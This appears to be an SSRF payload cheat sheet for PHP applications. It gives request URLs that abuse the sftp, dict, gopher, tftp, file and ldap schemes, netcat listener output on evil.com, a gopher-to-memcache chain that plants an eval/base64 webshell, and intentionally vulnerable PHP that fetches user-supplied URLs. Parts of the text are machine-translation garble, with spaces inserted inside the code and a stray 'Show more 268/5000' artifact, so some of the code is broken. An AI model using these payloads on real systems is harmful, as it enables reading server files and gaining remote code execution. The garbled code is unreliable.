## SSF PHP Function
```
file_get_contents()
fsockopen()
curl_exec()
```   

#### SFTP
```
http://0cx.cc/ssrf.php?url=sftp://evil.com:11111/

evil.com:$ nc -v -l 11111
Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
SSH-2.0-libssh2_1.4.2
```

#### DICT
```
http://0cx.cc/ssrf.php?dict://attacker:11111/

evil.com:$ nc -v -l 11111
Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
CLIENT libcurl 7.40.0
```

#### Gopher
```php
// http://0cx.cc/ssrf.php?url=http://evil.com/gopher.php
<?php
        header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');
?>

evil.com:# nc -v -l 12346
Listening on [0.0.0.0] (family 0, port 12346)
Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)
HI
Multiline
test
```

#### TFTP
```
http://0cx.cc/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET

evil.com:# nc -v -u -l 12346
Listening on [0.0.0.0] (family 0, port 12346)
TESTUDPPACKEToctettsize0blksize512timeout6
```

#### file
```
http://0cx.cc/redirect.php?url=file:///etc/passwd
```

#### ldap 
```
http://0cx.cc/redirect.php?url=ldap://localhost:11211/%0astats%0aquit
```

### PHP-FPM 
`PHP-FPM universal SSRF bypass safe_mode/disabled_functions/o exploit`

### SSRF memcache Getshell 
Generate serialize    
```
<?php
    $code=array('global_start'=>'@eval($_REQUEST[\'eval\']);');
    echo serialize($code)."\n".strlen(serialize($code));
```
#### Output 
```
a: 1: {s: 12: "global_start"; s: 25: "@ eval ($ _ REQUEST ['eval']);";} // Serialized data 59 // String length
```
#### Webshell.php
```php

<?Php
//gopher keyi huàn chéng rúshàng qíta fangshì
    header('Location: Gopher://[Target ip]:11211/_%0D%0aset ssrftest 1 0 147%0d%0aa:2:{S:6:"Output";a:1:{S:4:"Preg";a:2:{S:6:"Search";s:5:"/.*/E";s:7:"Replace";s:33:"Eval(base64_decode($_POST[ccc]));";}}s:13:"Rewritestatus";i:1;}%0D%0a');
?>
Show more
268/5000
<? php
// gopher can be replaced with other methods as above
     header ('Location: gopher: // [target ip]: 11211 / _% 0d% 0aset ssrftest 1 0 147% 0d% 0aa: 2: {s: 6: "output"; a: 1: {s: 4: "preg"; a: 2: {s: 6: "search"; s: 5: "/.*/ e"; s: 7: "replace"; s: 33: "eval (base64_decode ($ _ POST [ccc ])); ";}} s: 13:" rewritestatus "; i: 1;}% 0d% 0a ');
?>
```
#### Backup.php
```php
<?php
    header('Location: gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a');
?>
```
#### clear data
```
http://bbs.0cx.cc/forum.php?mod=ajax&action=downremoteimg&message=[img]http://myserver/back.php?logo.jpg[/img]
```

# PHP bonus 
refresher of PHP vuln function:       
```php
file_get_contents ()
fsockopen ()
curl_exec ()
readfile ()
```

example:    
```php
<? php
 function curl ( $ url ) {
                 $ ch = curl_init ();
                curl_setopt ( $ ch , CURLOPT_URL, $ url );
                curl_setopt ( $ ch , CURLOPT_HEADER, 0 );
                curl_exec ( $ ch );
                curl_close ( $ ch );
}
$ url = $ _GET ['url' ];
curl ( $ url );
 ?>
<? php
 function Getfile ( $ host , $ port , $ link ) {
     $ fp = fsockopen ( $ host , intval ( $ port ), $ errno , $ errstr , 30 );
     if (! $ fp ) {
         echo " $ errstr (error number $ errno ) \ n " ;
    } else {
         $ out = "GET $ link HTTP / 1.1 \ r \ n" ;
         $ out . = "HOST $ host \ r \ n" ;
         $ out . = "Connection: Close \ r \ n \ r \ n" ;
         $ out . = "\ r \ n" ;
         fwrite ( $ fp , $ out );
         $ content = '' ;
         while (! feof ( $ fp )) {
             $ contents . = fgets ( $ fp , 1024 );
        }
        fclose ( $ fp );
         return  $ contents ;
    }
}
$ url = $ _GET ['url' ];
 echo  file_get_contents ( $ url );
```

